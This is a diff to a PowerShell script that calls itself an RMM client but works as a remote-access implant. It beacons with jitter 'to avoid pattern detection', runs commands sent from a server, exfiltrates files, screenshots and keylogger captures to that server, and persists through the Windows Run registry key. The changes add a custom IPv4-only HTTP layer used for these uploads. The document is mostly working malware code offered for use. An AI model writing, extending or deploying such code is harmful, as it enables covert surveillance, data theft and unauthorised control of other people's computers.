@@ -1,5 +1,11 @@
 # Enhanced RMM PowerShell Client with Dynamic Configuration
 # Set RMM_BASE_URL in the environment to override (no trailing slash), or edit $u below.
+#
+# HTTP connections (optional):
+#   - Tunnel host is always reached over IPv4: DNS returns only A records; IPv6 literals / IPv6-only DNS are rejected.
+#   - Default: new HttpWebRequest each call, KeepAlive=false (TCP typically closes after each exchange; no shared cookie jar).
+#   - Persistent: CookieContainer + KeepAlive=true (TCP may stay open across requests).
+#   Set $persistentHttp = $true below, or set environment variable RMM_PERSISTENT_HTTP=1 (env wins when set and non-empty).
 
 if ($env:RMM_BASE_URL -and $env:RMM_BASE_URL.Trim().Length -gt 0) {
     $u = $env:RMM_BASE_URL.Trim().TrimEnd('/')
@@ -23,6 +29,201 @@ $jitterPercent = 30             # Default 30% jitter
 $maxRetries = 3
 $currentRetry = 0
 
+# Persistent HTTP: $false = no shared CookieContainer (default). $true = reuse cookies across calls.
+# Env RMM_PERSISTENT_HTTP (1/true/yes/on) overrides this when the variable is set and non-empty.
+$persistentHttp = $false
+
+$script:UsePersistentHttp = $false
+if ($env:RMM_PERSISTENT_HTTP -and $env:RMM_PERSISTENT_HTTP.Trim().Length -gt 0) {
+    $script:UsePersistentHttp = $env:RMM_PERSISTENT_HTTP.Trim() -match '^(?i)(1|true|yes|on)$'
+} else {
+    $script:UsePersistentHttp = $persistentHttp
+}
+if ($script:UsePersistentHttp) {
+    $script:RmmCookieContainer = New-Object System.Net.CookieContainer
+} else {
+    $script:RmmCookieContainer = $null
+}
+
+function Resolve-RmmTunnelIpv4 {
+    param([Parameter(Mandatory = $true)][System.Uri]$Uri)
+    $hostPart = $Uri.Host
+    if ($hostPart -match '^\[.*\]$') {
+        throw "RMM: IPv6 URL hosts are not supported. Use the tunnel hostname or an IPv4 address."
+    }
+    $parsed = $null
+    if ([System.Net.IPAddress]::TryParse($hostPart, [ref]$parsed)) {
+        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
+            return @{ Ipv4 = $parsed; OriginalHost = $hostPart }
+        }
+        if ($parsed.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetworkV6) {
+            throw "RMM: IPv6 address in URL is not supported. Use a hostname with an A record or an IPv4 literal."
+        }
+    }
+    $ipv4 = $null
+    foreach ($a in [System.Net.Dns]::GetHostAddresses($hostPart)) {
+        if ($a.AddressFamily -eq [System.Net.Sockets.AddressFamily]::InterNetwork) {
+            $ipv4 = $a
+            break
+        }
+    }
+    if ($null -eq $ipv4) {
+        throw "RMM: No IPv4 address for host '$hostPart' (IPv6-only or unresolved). The client cannot use IPv6 to reach the tunnel."
+    }
+    return @{ Ipv4 = $ipv4; OriginalHost = $hostPart }
+}
+
+function Convert-RmmHttpResponseContent {
+    param(
+        [string]$Raw,
+        [string]$ContentType
+    )
+    if ($null -eq $Raw) { return $null }
+    $trim = $Raw.Trim()
+    if ($trim.Length -eq 0) { return $null }
+    $ct = if ($ContentType) { $ContentType } else { '' }
+    $looksJson = ($ct -match 'json') -or ($trim.StartsWith('{')) -or ($trim.StartsWith('['))
+    if ($looksJson) {
+        try {
+            return $Raw | ConvertFrom-Json
+        } catch {
+            return $Raw
+        }
+    }
+    return $Raw
+}
+
+function Invoke-RmmRestMethod {
+    param(
+        [Parameter(Mandatory = $true)][string]$Uri,
+        [ValidateSet('Get', 'Post')][string]$Method = 'Get',
+        [object]$Body,
+        [string]$ContentType,
+        [hashtable]$Headers = @{},
+        [ValidateSet('Continue', 'Stop', 'SilentlyContinue', 'Ignore')][string]$RestErrorAction = 'Continue'
+    )
+    if ($null -eq $Headers) { $Headers = @{} }
+
+    $origUri = $null
+    try {
+        $origUri = [System.Uri]::new($Uri)
+    } catch {
+        if ($RestErrorAction -eq 'Stop') { throw }
+        return $null
+    }
+
+    $resolved = $null
+    try {
+        $resolved = Resolve-RmmTunnelIpv4 -Uri $origUri
+    } catch {
+        if ($RestErrorAction -eq 'Stop') { throw }
+        return $null
+    }
+
+    $builder = New-Object System.UriBuilder $origUri
+    $builder.Host = $resolved.Ipv4.ToString()
+    $wireUri = $builder.Uri
+
+    $req = [System.Net.HttpWebRequest]::Create($wireUri)
+    $req.Method = $Method
+    $req.Host = $resolved.OriginalHost
+    $req.AllowAutoRedirect = $true
+    $req.Timeout = 300000
+    # Default: HTTP keep-alive off so each request tends to close the TCP flow after the exchange (Wireshark-friendly).
+    # Persistent mode: keep-alive on so one TCP can carry multiple requests.
+    $req.KeepAlive = [bool]$script:UsePersistentHttp
+    if ($script:UsePersistentHttp -and $script:RmmCookieContainer) {
+        $req.CookieContainer = $script:RmmCookieContainer
+    }
+
+    foreach ($key in $Headers.Keys) {
+        $name = [string]$key
+        $val = [string]$Headers[$key]
+        if ($name -match '(?i)^(User-Agent)$') {
+            $req.UserAgent = $val
+        } elseif ($name -match '(?i)^(Accept)$') {
+            $req.Accept = $val
+        } elseif ($name -match '(?i)^(Host|Connection)$') {
+            continue
+        } else {
+            try {
+                [void]$req.Headers.Add($name, $val)
+            } catch {
+                try {
+                    $req.Headers[$name] = $val
+                } catch {
+                }
+            }
+        }
+    }
+
+    if ($Method -eq 'Post' -and $null -ne $Body) {
+        if ($ContentType) {
+            $req.ContentType = $ContentType
+        } else {
+            $req.ContentType = 'text/plain; charset=utf-8'
+        }
+        $enc = [System.Text.Encoding]::UTF8
+        $bytes = $enc.GetBytes([string]$Body)
+        $req.ContentLength = $bytes.Length
+        $ws = $req.GetRequestStream()
+        try {
+            $ws.Write($bytes, 0, $bytes.Length)
+        } finally {
+            $ws.Close()
+        }
+    }
+
+    try {
+        $response = $req.GetResponse()
+        $http = [System.Net.HttpWebResponse]$response
+        $statusNum = [int]$http.StatusCode
+        if ($statusNum -ge 400) {
+            try {
+                $es = $http.GetResponseStream()
+                $er = New-Object System.IO.StreamReader($es, [System.Text.Encoding]::UTF8)
+                $null = $er.ReadToEnd()
+                $er.Close()
+            } catch {
+            }
+            throw [System.Net.WebException]::new(
+                "The remote server returned an error: ($statusNum) $($http.StatusCode).",
+                $null,
+                [System.Net.WebExceptionStatus]::ProtocolError,
+                $http)
+        }
+        $rs = $http.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($rs, [System.Text.Encoding]::UTF8)
+        $raw = $reader.ReadToEnd()
+        $reader.Close()
+        $ctOut = $http.ContentType
+        $http.Close()
+        return (Convert-RmmHttpResponseContent -Raw $raw -ContentType $ctOut)
+    } catch [System.Net.WebException] {
+        $we = $_.Exception
+        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
+            if ($we.Response) {
+                try {
+                    $errs = $we.Response.GetResponseStream()
+                    $edr = New-Object System.IO.StreamReader($errs, [System.Text.Encoding]::UTF8)
+                    $null = $edr.ReadToEnd()
+                    $edr.Close()
+                } catch {
+                }
+                try { $we.Response.Close() } catch {
+                }
+            }
+            return $null
+        }
+        throw $we
+    } catch {
+        if ($RestErrorAction -eq 'SilentlyContinue' -or $RestErrorAction -eq 'Ignore' -or $RestErrorAction -eq 'Continue') {
+            return $null
+        }
+        throw
+    }
+}
+
 # Jitter function - adds random delay to avoid pattern detection
 function Get-JitteredSleep {
     param(
@@ -39,7 +240,7 @@ function Get-JitteredSleep {
     $microJitter = Get-Random -Minimum 100 -Maximum 1000
     $totalMilliseconds = ($actualSleep * 1000) + $microJitter
     
-    Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micrm ro: $microJitter ms)" -ForegroundColor DarkGray
+    Write-Host "[*] Sleeping for $actualSleep.$microJitter seconds (base: $baseSeconds, jitter: $jitterValue sec, micro: $microJitter ms)" -ForegroundColor DarkGray
     
     # Sleep using milliseconds only
     Start-Sleep -Milliseconds $totalMilliseconds
@@ -71,17 +272,23 @@ function Get-BackoffSleep {
     return $jitteredBackoff
 }
 
-# Update configuration from server
+# Update configuration from server (idle __CONFIG__ no-op returns early without log noise).
 function Update-Configuration {
     param([string]$configString)
-    
-    Write-Host "[*] Processing configuration update: $configString" -ForegroundColor Cyan
     
     $parts = $configString -split " "
     if ($parts.Count -ge 3) {
         try {
             $newSleep = [int]$parts[1]
             $newJitter = [int]$parts[2]
+            # Server sends __CONFIG__ on every idle /cmd; skip logs and work when nothing changed.
+            if ($newSleep -eq $script:baseSleepSeconds -and $newJitter -eq $script:jitterPercent -and
+                $newSleep -ge 1 -and $newSleep -le 3600 -and $newJitter -ge 0 -and $newJitter -le 100) {
+                return
+            }
+            
+            Write-Host "[*] Processing configuration update: $configString" -ForegroundColor Cyan
+            
             $changed = $false
             
             # Validate ranges
@@ -110,7 +317,7 @@ function Update-Configuration {
                 try {
                     $ackUrl = "$u/result?id=$sessionId&type=config_ack"
                     $ackBody = "Configuration updated: Sleep=$baseSleepSeconds, Jitter=$jitterPercent%"
-                    Invoke-RestMethod -Uri $ackUrl -Method Post -Body $ackBody -ErrorAction SilentlyContinue
+                    Invoke-RmmRestMethod -Uri $ackUrl -Method Post -Body $ackBody -RestErrorAction SilentlyContinue
                     Write-Host "[+] Configuration acknowledgment sent" -ForegroundColor DarkGray
                 } catch {
                     # Silently ignore ACK errors
@@ -185,7 +392,7 @@ function Send-RmmTextResult {
     $uri = "$u/result?id=$sessionId"
     $payload = [ordered]@{ rmm_cmd = $CommandLine; rmm_output = $Text }
     $json = $payload | ConvertTo-Json -Compress -Depth 10
-    Invoke-RestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -ErrorAction SilentlyContinue
+    Invoke-RmmRestMethod -Uri $uri -Method Post -Body $json -ContentType 'application/json; charset=utf-8' -Headers $Headers -RestErrorAction SilentlyContinue
 }
 
 # 2>&1 on native exes turns stderr into ErrorRecord; Out-String then dumps script position noise.
@@ -340,6 +547,11 @@ $retryCount = 0
 
 Write-Host "[*] Starting RMM client with Session ID: $sessionId" -ForegroundColor Cyan
 Write-Host "[*] Default beacon: $baseSleepSeconds seconds with $jitterPercent% jitter" -ForegroundColor Cyan
+if ($script:UsePersistentHttp) {
+    Write-Host "[*] HTTP: persistent cookies + TCP keep-alive. IPv4-only. Clear RMM_PERSISTENT_HTTP / set `$persistentHttp = `$false` for default." -ForegroundColor DarkGray
+} else {
+    Write-Host "[*] HTTP: IPv4-only; KeepAlive=false (TCP usually closes after each request). Persistent: `$persistentHttp = `$true` or RMM_PERSISTENT_HTTP=1." -ForegroundColor DarkGray
+}
 
 while (-not $registered -and $retryCount -lt $maxRetries) {
     try {
@@ -350,7 +562,7 @@ while (-not $registered -and $retryCount -lt $maxRetries) {
             "Cache-Control" = "no-cache"
         }
         
-        $response = Invoke-RestMethod -Uri $registerUrl -Method Get -Headers $headers -ErrorAction Stop
+        $response = Invoke-RmmRestMethod -Uri $registerUrl -Method Get -Headers $headers -RestErrorAction Stop
         Write-Host "[+] Registered with RMM server (ID: $sessionId)" -ForegroundColor Green
         $registered = $true
         $currentRetry = 0
@@ -392,7 +604,7 @@ while ($true) {
         
         # Get command from RMM
         $cmdUrl = "$u/cmd?id=$sessionId"
-        $response = Invoke-RestMethod -Uri $cmdUrl -Method Get -Headers $headers -ErrorAction Stop
+        $response = Invoke-RmmRestMethod -Uri $cmdUrl -Method Get -Headers $headers -RestErrorAction Stop
         
         # Reset retry counter on success
         $currentRetry = 0
@@ -403,14 +615,14 @@ while ($true) {
         $cmdType = [string]$cmdData.type
         
         if ($command -and $command -ne "") {
+            if ($command -like "__CONFIG__ *") {
+                $null = Update-Configuration -configString $command
+                continue
+            }
             Write-Host "[>] Received command: $command" -ForegroundColor Cyan
             
             # Handle special commands FIRST before anything else
-            if ($command -like "__CONFIG__ *") {
-                # Dynamic configuration update
-                Update-Configuration -configString $command
-            }
-            elseif ($command -eq "__STOP__") {
+            if ($command -eq "__STOP__") {
                 Write-Host "[*] Stopping persistent command" -ForegroundColor Yellow
                 continue
             }
@@ -436,7 +648,7 @@ while ($true) {
                             content = $fileBase64
                         } | ConvertTo-Json -Compress
                         $resultUrl = "$u/result?id=$sessionId&type=file_upload"
-                        Invoke-RestMethod -Uri $resultUrl -Method Post -Body $resultData -ContentType "application/json" -Headers $headers -ErrorAction Stop
+                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $resultData -ContentType "application/json" -Headers $headers -RestErrorAction Stop
                         Write-Host "[+] File exfiltrated: $filePath" -ForegroundColor Green
                     }
                 } else {
@@ -481,7 +693,7 @@ while ($true) {
                     $memoryStream.Dispose()
                     
                     $resultUrl = "$u/result?id=$sessionId&type=screenshot"
-                    Invoke-RestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -ErrorAction Stop
+                    Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $screenshotBase64 -Headers $headers -RestErrorAction Stop
                     Write-Host "[+] Screenshot captured and sent" -ForegroundColor Green
                 } catch {
                     $errorMsg = "Screenshot failed: $_"
@@ -553,7 +765,7 @@ while ($true) {
                         $logData = [System.IO.File]::ReadAllText($kp)
                         if (-not $logData) { $logData = "(empty buffer)" }
                         $resultUrl = "$u/result?id=$sessionId&type=keylog"
-                        Invoke-RestMethod -Uri $resultUrl -Method Post -Body $logData -Headers $headers -ErrorAction SilentlyContinue
+                        Invoke-RmmRestMethod -Uri $resultUrl -Method Post -Body $logData -Headers $headers -RestErrorAction SilentlyContinue
                         Write-Host "[+] Keylog data sent" -ForegroundColor Green
                     } else {
                         Send-RmmTextResult -CommandLine $command -Text "Keylogger log not found or not started" -Headers $headers
@@ -575,6 +787,8 @@ while ($true) {
                 $currentScript = $currentScript -replace '(?m)^\s*\$u\s*=\s*.+$', ('$u = ''{0}''' -f $uEsc)
                 $currentScript = $currentScript -replace '(?m)^\s*\$baseSleepSeconds\s*=\s*\d+', ('$baseSleepSeconds = {0}' -f $baseSleepSeconds)
                 $currentScript = $currentScript -replace '(?m)^\s*\$jitterPercent\s*=\s*\d+', ('$jitterPercent = {0}' -f $jitterPercent)
+                $ph = if ($script:UsePersistentHttp) { '$true' } else { '$false' }
+                $currentScript = $currentScript -replace '(?m)^\s*\$persistentHttp\s*=\s*\$(?:true|false)\s*$', ('$persistentHttp = {0}' -f $ph)
                 Set-Content -LiteralPath $scriptPath -Value $currentScript -Encoding UTF8 -Force
                 
                 $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
